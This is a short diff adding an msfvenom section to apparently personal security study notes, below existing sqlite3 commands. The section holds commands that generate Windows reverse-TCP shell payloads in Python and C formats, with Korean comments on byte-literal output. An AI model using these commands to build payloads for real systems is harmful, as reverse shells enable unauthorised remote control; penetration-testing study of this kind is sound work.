@@ -56,3 +56,12 @@ sqlite3 {dbname}
 select * from user;
 .quit
 ```
+---
+# msfvenom
+```bash
+msfvenom -p windows/shell/reverse_tcp -f python
+# 바이트 타입을 명시하기 위해서 b가 붙여서 나옴.
+
+msfvenom -p windows/shell/reverse_tcp -f c
+# 바이트 타입 명시 필요 없어서 b가 안붙여서 나옴.
+```
